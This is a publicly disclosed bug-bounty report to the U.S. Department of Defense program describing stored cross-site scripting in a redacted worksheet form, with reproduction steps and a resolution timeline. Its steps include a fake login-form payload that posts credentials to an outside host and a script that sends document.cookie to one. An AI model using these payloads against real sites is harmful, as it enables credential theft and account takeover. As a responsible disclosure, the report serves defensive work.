---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/cross-site-scripting-xss-stored
  - env/web
substate: "resolved"
weakness: "Cross-site Scripting (XSS) - Stored"
enriched: true
body: true
date: 2021-02-10
submitted: 2020-04-11T08:39:44.046Z
bounty_usd: null
votes: 9
cve: []
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "z32"
source: "https://hackerone.com/reports/847176"
title: "Stored XSS via 64(?) vulnerable fields in ███ leads to credential theft/account takeover"
---
# Stored XSS via 64(?) vulnerable fields in ███ leads to credential theft/account takeover

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 9 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2021-02-10

- Report: [https://hackerone.com/reports/847176](https://hackerone.com/reports/847176)
- CWE: Cross-site Scripting (XSS) - Stored
- Submitted: 2020-04-11T08:39:44.046Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

**Summary:**
A user is able to complete a ████████ worksheets via https://██████████. This form allows a user to store multiple XSS payloads within, which will in turn allow the attacker to run malicious code in context of the legal personnel who view the request.

## Impact
The attacker can have multiple effects from this vulnerability, to include but not limited to account compromise, keystroke logging, drive-by downloads, and much more.

## Step-by-step Reproduction Instructions

1. Browse to https://█████
████████
2. Click `█████████`. Once on the ██████ page, click `███ and ████████`
██████████
3. Click `Continue`.
██████
4. Fill in your name and click `Submit`. XSS payloads seem to be sanitized properly here from basic tests.
███
5. Any field that accepts text in the rest of the document seems vulnerable to XSS. Complete the form, filling in XSS payloads anywhere you can type. I counted 64 vulnerable fields total.
█████████
7. Click `Finish`. You will see a confirmation that your request was submitting and receive a ticket number.
█████████
8. Click `██████`, or return to the `███████` page and put in your info in the `█████` area to modify the worksheet. The XSS will fire in both locations.
█████████
9. To demonstrate credential theft/account takeover, I used the following (very obvious) payload. There are various ways an attacker could do this and nothing seems to be filtered:

```
<h3>Please login to proceed</h3> <form action=http://██████>Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br><input type="submit" value="Logon"></br>
```
█████████
███

An attacker can also redirect the user as soon as the worksheet is opened, but as an unauthenticated user I was unable to test for cookie theft:
`<script>window.location="http://███/?cookie=" + document.cookie</script>`
██████

## Suggested Mitigation/Remediation Actions
Sanitize any fields where user input is reflected and disallow special characters from being submitted in each form field.

## Impact

The attacker can have multiple effects from this vulnerability, to include but not limited to account compromise, keystroke logging, drive-by downloads, and much more.

## Timeline

- **Report Filed**
- **2020-04-11** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **2020-04-11** @z32: Could you please add @sheepkiller to the report as a participant? Thanks in advance!
- **Report Severity Updated**
- **Report Triaged**
- **2020-04-13** @z32: Hey @agent-r5,

Could you add @sheepkiller as a participant to this one?

Thanks in advance!
@un4gi
- **2020-04-13** @agent-r5: did. still pending
- **2020-04-13** @z32: Oh ok, sorry about that! Thanks!
- **External User Joined**
- **2020-04-13** @agent-r5: no worries. i realize researchers cannot see everything we do on reports.
- **2020-04-13** @sheepkiller: thanks
- **Report Resolved**
- **2021-02-05** @z32: Hello @agent-r5 @agent-j5,

Can we disclose and if so can you please redact any instance of ███████ (including this comment)?

Regards,
@un4gi
- **2021-02-05** @agent-l8: In the comments drop down hit request disclosure- and it gets thrown into our queue. Usually takes ~ 1 week to review/redact/release. Yes we will clear that IP. Thanks!
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
